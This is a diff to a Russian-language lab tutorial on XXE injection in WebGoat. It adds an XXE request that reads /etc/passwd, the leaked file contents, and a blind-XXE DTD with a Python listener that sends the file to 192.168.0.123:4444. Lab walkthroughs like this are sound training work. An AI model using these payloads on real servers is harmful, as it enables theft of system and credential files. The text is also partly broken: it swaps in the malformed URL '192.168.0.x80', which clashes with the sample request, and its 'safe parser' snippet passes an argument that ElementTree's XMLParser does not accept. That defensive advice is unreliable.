@@ -53,7 +53,7 @@ XML-парсеры часто поддерживают DTD (Document Type Defini
 ### Настройка WebGoat
 
 1. Убедитесь, что WebGoat запущен: `docker run -d -p 8080:8080 webgoat/goatandwolf`
-2. Откройте http://localhost:8080/WebGoat
+2. Откройте http://192.168.0.x80/WebGoat
 3. Перейдите в **XXE** → **XXE Injection**
 
 ### Практика: Чтение файла через XXE
@@ -121,7 +121,93 @@ Content-Type: application/xml
 2. **Скриншот 2**: Burp Repeater — XXE пейлоад, ответ содержит содержимое файла
 3. **Скриншот 3**: WebGoat — задание XXE выполнено (зеленая галочка)
 
+### Примеры вывода
+
+**Успешный XXE запрос в Burp Repeater:**
+```
+POST /WebGoat/xxe/simple HTTP/1.1
+Host: localhost:8080
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<comment>
+  <text>&xxe;</text>
+</comment>
+```
+
+**Ответ сервера:**
+```
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"lessonCompleted": true, "feedback": "root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+..."}
+```
+
+**Blind XXE — проверка через локальный сервер:**
+```bash
+# На macOS запуск сервера для приема exfiltration
+python3 -m http.server 4444
+
+# Логи сервера при Blind XXE:
+192.168.0.123 - - [29/Apr/2026 12:34:56] "GET /xxe.dtd HTTP/1.1" 200 -
+192.168.0.123 - - [29/Apr/2026 12:34:57] "GET /?data=root:x:0:0:root... HTTP/1.1" 200 -
+```
+
+### Частые ошибки
+
+1. **Забыть про DTD** — XXE работает через объявление `<!DOCTYPE`
+2. **Использовать относительные пути** — лучше использовать абсолютные (`file:///etc/passwd`)
+3. **Blind XXE без exfiltration** — нужен внешний сервер для приема данных
+4. **Неправильный Content-Type** — должен быть `application/xml`, а не `application/x-www-form-urlencoded`
+
+### Вопросы на понимание
+
+1. Почему XXE работает только если XML-парсер обрабатывает DTD?
+2. В чем разница между обычным XXE и Blind XXE?
+3. Как защититься от XXE на стороне сервера?
+4. Почему `file:///etc/passwd` работает, а `http://192.168.0.x` может быть заблокирован?
+
+### Адаптация под macOS (M2)
+
+```bash
+# Blind XXE — хостинг DTD файла на macOS (M2)
+cat > /tmp/xxe.dtd << 'EOF'
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.0.123:4444/?data=%file;'>">
+%eval;
+%exfil;
+EOF
+
+# Запуск сервера (для приема данных и отдачи DTD)
+cd /tmp && python3 -m http.server 4444
+
+# Проверка DTD доступности
+curl http://192.168.0.123:4444/xxe.dtd
+
+# XXE в Python (проверка уязвимости локально)
+python3 -c "
+import xml.etree.ElementTree as ET
+# Безопасный парсер
+parser = ET.XMLParser(resolve_entities=False)
+"
+```
+
 ---
+
+
+## Адаптация под macOS (M2, 8GB)
+
+- Для установки инструментов используйте Homebrew: `brew install <tool>`
+- На MacBook Air M2 (8GB) запускайте VM с памятью не более 3-4GB
+- Используйте UTM вместо VirtualBox (лучшая поддержка ARM)
+- Docker работает нативно на M2: `docker pull <image>`
+- Для VPN используйте Tunnelblick (OpenVPN) или официальные клиенты
+- Для Python используйте `pip3 install` вместо `pip install`
+
 
 ## Задачи для самостоятельного выполнения
 
